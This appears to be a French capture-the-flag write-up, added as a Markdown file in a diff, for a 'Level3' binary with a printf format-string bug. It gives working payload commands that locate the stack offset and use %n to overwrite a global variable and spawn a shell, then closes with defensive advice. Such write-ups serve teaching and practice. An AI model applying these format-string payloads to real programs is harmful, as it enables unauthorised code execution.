@@ -1,0 +1,75 @@
+# Exploitation de Format String - Level3
+
+## Analyse du Programme
+
+Le programme contient une fonction `v()` qui présente une vulnérabilité de format string. Voici son code :
+
+```c
+void v(void) {
+    char local_20c [520];
+    
+    fgets(local_20c, 0x200, stdin);
+    printf(local_20c);  // Vulnérabilité ici - pas de format string spécifié
+    if (m == 0x40) {
+        fwrite("Wait what?!\n", 1, 0xc, stdout);
+        system("/bin/sh");
+    }
+    return;
+}
+```
+
+## Points Clés de Théorie
+
+1. **Vulnérabilité Format String**
+   - La fonction `printf()` est appelée sans format string spécifié
+   - L'utilisateur peut contrôler le format string
+   - Permet de lire/écrire en mémoire
+
+2. **Variable Critique**
+   - Variable globale `m` à l'adresse `0x0804988c`
+   - Si `m == 0x40`, un shell est lancé
+
+3. **Techniques d'Exploitation**
+   - Utilisation de `%x` pour lire la pile
+   - Utilisation de `%n` pour écrire en mémoire
+   - Calcul précis du nombre de caractères pour obtenir la valeur désirée
+
+## Étapes de l'Exploitation
+
+1. **Trouver l'Offset**
+   ```bash
+   (python -c "print 'AAAA' + '%x'*10") | ./level3
+   ```
+   - AAAA sert de marqueur
+   - %x affiche les valeurs de la pile
+   - Permet de trouver la position de notre entrée
+
+2. **Localiser la Variable**
+   ```bash
+   objdump -t ./level3
+   ```
+   - Trouve l'adresse de la variable `m`: `0x0804988c`
+
+3. **Exploitation Finale**
+   ```bash
+   (python -c "print '\x8c\x98\x04\x08' + '%60x%4\$n'"; cat) | ./level3
+   ```
+   - `\x8c\x98\x04\x08`: Adresse de la variable m
+   - `%60x`: Écrit 60 caractères
+   - `%4\$n`: Écrit le nombre total de caractères (64 = 0x40) à l'adresse spécifiée
+   - `cat`: Maintient le shell ouvert
+
+## Explication Technique
+
+- L'adresse de `m` (4 octets) + 60 caractères = 64 caractères au total
+- `%n` écrit le nombre de caractères imprimés à l'adresse spécifiée
+- 64 en hexadécimal = 0x40, ce qui déclenche le shell
+- Le `cat` final permet d'interagir avec le shell obtenu
+
+## Sécurité
+
+Cette vulnérabilité illustre l'importance de :
+- Toujours spécifier un format string dans printf
+- Valider les entrées utilisateur
+- Protéger les variables critiques
+- Utiliser des mécanismes de protection comme ASLR et DEP
